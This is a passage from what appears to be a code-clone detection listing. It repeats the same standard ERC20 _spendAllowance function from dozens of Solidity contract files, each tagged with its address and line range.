        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="125" endline="135" pcid="7643">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="123" endline="133" pcid="525">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="121" endline="131" pcid="5410">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="123" endline="133" pcid="5582">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="125" endline="135" pcid="4439">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="125" endline="135" pcid="269">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="125" endline="135" pcid="4409">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="121" endline="131" pcid="8326">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="126" endline="136" pcid="4749">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="123" endline="133" pcid="6286">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="123" endline="133" pcid="1228">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="123" endline="133" pcid="5968">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="125" endline="135" pcid="6650">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="121" endline="131" pcid="3993">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="121" endline="131" pcid="4309">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="122" endline="132" pcid="1168">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="123" endline="133" pcid="254">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="122" endline="132" pcid="5084">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="125" endline="135" pcid="4232">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="126" endline="136" pcid="1072">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="123" endline="133" pcid="6341">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="125" endline="135" pcid="7720">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="125" endline="135" pcid="2008">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="126" endline="136" pcid="8729">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="128" endline="138" pcid="570">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="124" endline="134" pcid="1956">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="125" endline="135" pcid="6221">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="125" endline="135" pcid="167">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="214" endline="224" pcid="3948">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="121" endline="131" pcid="796">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="125" endline="135" pcid="1853">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="121" endline="131" pcid="5726">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="124" endline="134" pcid="2023">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="125" endline="135" pcid="337">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="122" endline="132" pcid="7272">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="121" endline="131" pcid="8491">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="127" endline="137" pcid="5114">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="127" endline="137" pcid="5069">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x80a2f100cb796a142faca9f6ffc31dabb0b0663f.sol" startline="123" endline="133" pcid="4800">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="125" endline="135" pcid="7494">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="122" endline="132" pcid="6081">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="128" endline="138" pcid="585">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="123" endline="133" pcid="7966">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="741" endline="751" pcid="6832">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="121" endline="131" pcid="4834">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="124" endline="134" pcid="8606">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="121" endline="131" pcid="7157">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="122" endline="132" pcid="8903">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="118" endline="128" pcid="6917">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="120" endline="130" pcid="903">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="126" endline="136" pcid="4277">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x827f6ADc76821927E8f43ECA46eEC57d4338A421.sol" startline="208" endline="218" pcid="4909">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="125" endline="135" pcid="1205">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="216" endline="226" pcid="1103">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="121" endline="131" pcid="367">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="125" endline="135" pcid="6677">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="128" endline="138" pcid="1674">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="121" endline="131" pcid="6588">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="226" endline="236" pcid="383">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="121" endline="131" pcid="933">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="122" endline="132" pcid="6817">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="121" endline="131" pcid="4053">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="220" endline="230" pcid="7375">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="124" endline="134" pcid="5325">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="123" endline="133" pcid="5054">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="121" endline="131" pcid="7628">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="120" endline="130" pcid="4292">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="122" endline="132" pcid="6692">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="125" endline="135" pcid="6962">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="125" endline="135" pcid="7547">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="124" endline="134" pcid="8539">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="121" endline="131" pcid="8371">
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
